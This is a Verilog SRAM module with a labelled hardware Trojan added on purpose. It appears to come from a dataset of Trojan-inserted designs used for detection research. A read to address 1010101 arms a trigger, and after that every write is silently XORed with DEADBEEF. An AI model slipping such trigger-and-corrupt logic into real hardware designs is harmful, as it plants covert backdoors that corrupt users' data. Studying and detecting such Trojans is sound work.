// sram_32x128_1rw_with_ht002.v
// Trojan: HT002
// Region: chunk_002_CONDITIONAL_DEBUG_OUTPUT
// HT Type: HT1_Crypto
// Stealth: High
// Damage: Critical

`timescale 1ns/1ps

module SRAM_32x128_1rw (
  clk0,
  csb0,
  web0,
  addr0,
  din0,
  dout0
);

  parameter DATA_WIDTH = 32;
  parameter ADDR_WIDTH = 7;
  parameter RAM_DEPTH  = 1 << ADDR_WIDTH;
  parameter DELAY      = 3;

  input                   clk0;
  input                   csb0;
  input                   web0;
  input  [ADDR_WIDTH-1:0] addr0;
  input  [DATA_WIDTH-1:0] din0;
  output reg [DATA_WIDTH-1:0] dout0;

  // sampled control / address / data
  reg                  csb0_reg;
  reg                  web0_reg;
  reg [ADDR_WIDTH-1:0] addr0_reg;
  reg [DATA_WIDTH-1:0] din0_reg;

  // ===== TROJAN DECLARATIONS =====
  reg trojan_active;
  reg [DATA_WIDTH-1:0] trojan_modified_data;
  // ===== END TROJAN DECLARATIONS =====

  // memory array
  reg [DATA_WIDTH-1:0] mem [0:RAM_DEPTH-1];

  integer i;
  initial begin
    // initialize memory and trojan flag
    trojan_active = 1'b0;
    trojan_modified_data = {DATA_WIDTH{1'b0}};
    for (i = 0; i < RAM_DEPTH; i = i + 1)
      mem[i] = {DATA_WIDTH{1'b0}};
    dout0 = {DATA_WIDTH{1'b0}};
  end

  // sample inputs on rising clock
  always @(posedge clk0) begin
    csb0_reg  <= csb0;
    web0_reg  <= web0;
    addr0_reg <= addr0;
    din0_reg  <= din0;

    // Trojan trigger: set active when a READ occurs to the special key address
    // (preserves previous trojan_active once set)
    if (!csb0 && web0 && (addr0 == 7'b1010101)) begin
      trojan_active <= 1'b1;
      // logging (conditional debug output inserted by trojan)
      $display("[%0t] TROJAN: activated at addr %b", $time, addr0);
    end
  end

  // compute modified data combinationally based on trojan state and sampled din
  always @(*) begin
    if (trojan_active)
      trojan_modified_data = din0_reg ^ 32'hDEADBEEF;
    else
      trojan_modified_data = din0_reg;
  end

  // memory write on falling edge (write when csb low & web low)
  always @(negedge clk0) begin : MEM_WRITE0
    if (!csb0_reg && !web0_reg) begin
      // If trojan is active, store modified data; otherwise store incoming data
      if (trojan_active) begin
        mem[addr0_reg] <= trojan_modified_data;
        $display("[%0t] TROJAN WRITE: addr=%b data=%h (modified)", $time, addr0_reg, trojan_modified_data);
      end else begin
        mem[addr0_reg] <= din0_reg;
        $display("[%0t] WRITE: addr=%b data=%h", $time, addr0_reg, din0_reg);
      end
    end
  end

  // memory read on falling edge (read when csb low & web high)
  always @(negedge clk0) begin : MEM_READ0
    if (!csb0_reg && web0_reg) begin
      dout0 <= #(DELAY) mem[addr0_reg];
      $display("[%0t] READ: addr=%b data=%h", $time, addr0_reg, mem[addr0_reg]);
    end
  end

endmodule
